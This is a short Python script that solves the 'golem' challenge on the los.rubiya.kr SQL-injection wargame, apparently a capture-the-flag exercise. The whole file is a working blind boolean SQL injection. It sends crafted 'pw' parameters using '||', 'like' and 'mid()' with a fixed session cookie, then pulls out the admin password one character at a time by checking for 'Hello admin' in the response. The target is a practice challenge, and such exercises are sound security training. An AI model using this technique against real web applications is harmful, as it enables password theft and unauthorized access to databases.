import requests
import string

pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookies = {'PHPSESSID':'di7sq95615k17gofpq7l55mqvf'}
for i in range(1,9):
    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw"
    for j in a:
        url="https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1'||id like 'admin' %26%26 mid(pw,"+str(i)+',1) like "'+str(j)+'"-- - '
        res=requests.get(url,cookies=cookies)
        res=res.text
        if "Hello admin" in res:
            pw+=j
            break
        else: pass
print(pw)
    
